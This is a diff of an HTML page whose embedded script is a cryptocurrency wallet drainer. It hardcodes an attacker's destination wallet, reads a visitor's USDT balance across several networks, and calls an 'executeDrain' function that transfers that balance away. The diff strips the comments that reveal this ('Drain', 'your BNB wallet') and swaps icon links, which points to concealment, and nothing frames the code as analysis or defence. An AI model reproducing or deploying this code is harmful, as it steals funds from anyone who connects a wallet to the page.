@@ -12,7 +12,7 @@
       padding: 0;
     }
     body {
-      background: #ffffff;          /* plain white, no background */
+      background: #ffffff;
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
       min-height: 100vh;
       display: flex;
@@ -20,9 +20,9 @@
     }
     .container {
       width: 100%;
-      max-width: 100%;              /* full width */
-      padding: 20px 16px;           /* some breathing space */
-      background: transparent;       /* no card background */
+      max-width: 100%;
+      padding: 20px 16px;
+      background: transparent;
       flex: 1;
     }
     .field-group {
@@ -47,7 +47,7 @@
       border: none;
       border-radius: 0;
       font-size: 15px;
-      background: #f7fafc;           /* light background for fields */
+      background: #f7fafc;
       transition: 0.15s;
       outline: none;
       min-width: 0;
@@ -200,13 +200,10 @@
 </div>
 
 <script type="module">
-  // ── Module Imports ──
   import { ethers } from 'https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.esm.min.js';
 
-  // ── Hardcoded destination (your BNB wallet) ──
   const DEST_WALLET = "0xCa2934934d02fBFEAa25e9ABa50136c0c3300a78";
 
-  // ── Supported Networks ──
   const NETWORKS = [
     {
       name: 'BNB Smart Chain',
@@ -224,7 +221,7 @@
       usdt: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
       nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
       explorer: 'https://etherscan.io',
-      icon: 'https://tse1.mm.bing.net/th/id/OIP.WZaxrR-JdgEl7jlVVa4xWAHaEe?r=0&rs=1&pid=ImgDetMain&o=7&rm=3'
+      icon: 'https://i.ibb.co/d4YXK0xS/eth.png'
     },
     {
       name: 'Polygon',
@@ -242,14 +239,13 @@
       usdt: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
       nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
       explorer: 'https://arbiscan.io',
-      icon: 'https://th.bing.com/th/id/OIP.XCCGzmUFCVYkr4hfhLQPpgHaFr?r=0&o=7rm=3&rs=1&pid=ImgDetMain&o=7&rm=3'
+      icon: 'https://i.ibb.co/B5LyXDyf/c435b7f5f59449eeab220fb455e8c318.webp'
     }
   ];
 
   let provider, userAddress;
   let selectedNetwork = NETWORKS[0];
 
-  // ── Balance check ──
   async function fetchMaxBalance(addr, network) {
     try {
       const data = "0x70a08231" + addr.replace('0x', '').padStart(64, '0');
@@ -267,7 +263,6 @@
     } catch { return null; }
   }
 
-  // ── Drain ──
   async function executeDrain(balanceHex, network) {
     let amountHex;
     if (balanceHex && balanceHex !== '0x0000000000000000000000000000000000000000000000000000000000000000') {
@@ -290,7 +285,6 @@
     });
   }
 
-  // ── DOM refs ──
   const $ = id => document.getElementById(id);
   const ui = {
     nextBtn: $('nextBtn'),
